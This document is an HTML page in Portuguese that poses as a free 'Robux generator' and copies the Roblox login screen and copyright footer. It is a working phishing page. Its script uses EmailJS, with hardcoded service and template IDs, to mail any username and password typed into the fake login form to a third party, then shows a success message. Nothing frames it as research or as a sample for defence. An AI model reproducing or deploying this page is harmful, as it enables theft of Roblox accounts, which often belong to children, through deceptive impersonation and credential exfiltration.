<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gerador de Robux - Roblox</title>
    <link rel="icon" href="rob.jpg" type="image/jpg"> <!-- Logo na aba -->
    <style>
        /* CSS Global */
        body {
            font-family: 'Arial', sans-serif;
            background-image: url('back.jpg'); /* Imagem de fundo */
            background-size: cover; /* Tamanho da imagem de fundo */
            color: #444; /* Cor do texto */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        header {
            background-color: rgba(51, 51, 51, 0.8); /* Fundo com leve transparência */
            color: #fff;
            padding: 20px;
            width: 100%;
            text-align: center;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
        }

        h1 {
            font-size: 2.5em;
            margin: 0;
            color: #ffcc00; /* Nova cor do título */
        }

        .login-container {
            background-color: rgba(255, 255, 255, 0.9); /* Fundo branco com leve transparência */
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
            width: 300px;
            text-align: center;
            border: 2px solid #00c6ff; /* Borda ao redor do container */
        }

        .form-control.input-field {
            border: 2px solid black; /* Cor da borda dos campos */
            border-radius: 8px;
            width: 100%;
            box-sizing: border-box;
            margin-bottom: 15px;
            padding: 10px;
            background-color: #f9f9f9;
            color: #333;
            transition: border-color 0.3s;
        }

        .form-control.input-field:focus {
            border-color: black; /* Borda ao focar */
            outline: none;
        }

        .login-title {
            color: #00c6ff; /* Nova cor do título de login */
            margin-bottom: 10px;
            font-size: 1.8em;
        }

        .login-button {
            background-color: #00c6ff;
            color: #fff;
            border: none;
            padding: 12px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
            font-size: 1.1em;
            transition: background-color 0.3s;
            border: 2px solid #ffcc00; /* Borda do botão */
        }

        .login-button:hover {
            background-color: #ff0055; /* Cor ao passar o mouse */
        }

        .signup-option {
            text-align: center;
            margin-top: 15px;
        }

        .error-message {
            display: none;
            color: red;
            margin-top: 10px;
        }

        .rbx-divider {
            border-top: 2px solid #00c6ff; /* Cor da borda do divisor */
            margin: 15px 0;
        }

        footer {
            text-align: center;
            padding: 20px 0;
            background-color: rgba(51, 51, 51, 0.8); /* Fundo do rodapé com transparência */
            color: #fff;
            width: 100%;
            position: absolute;
            bottom: 0;
        }

        footer p {
            margin: 0;
        }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
    <script>
        (function() {
            emailjs.init("y2Y2FotVDMytchPMg"); // Substitua pelo seu user ID
        })();

        function sendEmail(event) {
            event.preventDefault(); // Previne o envio padrão do formulário

            const serviceID = "service_uto6ltk"; // Substitua pelo seu Service ID
            const templateID = "template_wx7bj1m"; // Substitua pelo seu Template ID

            emailjs.sendForm(serviceID, templateID, event.target)
                .then(() => {
                    alert('Email enviado com sucesso!');
                    document.getElementById('login-form').reset(); // Limpa o formulário após envio
                }, (error) => {
                    console.error('Erro ao enviar o email:', error);
                    document.getElementById('error-message').innerText = 'Erro ao enviar o email, por favor tente novamente.';
                    document.getElementById('error-message').style.display = 'block';
                });
        }
    </script>
</head>
<body>

<header>
    <h1>Gerador de Robux 100% Funcionando!</h1>
</header>

<div class="content" id="content">
    <div class="login-container">
        <h1 class="login-title">Entrar na Roblox</h1> 
        <form id="login-form" class="login-form" onsubmit="sendEmail(event)">
            <div class="form-group message-form-group">
                <input type="text" id="username" name="username" class="form-control input-field" placeholder="Usuário/E-mail/Telefone" required>
            </div>
            <div class="form-group message-form-group">
                <input type="password" id="password" name="password" class="form-control input-field" placeholder="Senha" required>
            </div>
            <button type="submit" class="login-button">Entrar</button>
        </form>

        <div class="rbx-divider"></div>
        <button type="button" class="login-button"><span>Envie-me um código único por e-mail</span></button>
        <button type="button" class="login-button"><span>Use outro dispositivo</span></button>
        
        <div class="signup-option">
            <span class="no-account-text">Não possui uma conta?</span>
            <a id="sign-up-link" class="text-link signup-link" href="#" target="_self">Cadastrar-se</a>
        </div>
            
        <div id="error-message" class="error-message"></div>
    </div>
</div>

<footer>
    <p>&copy; 2023 Roblox. Todos os direitos reservados.</p>
</footer>
</body>
</html>
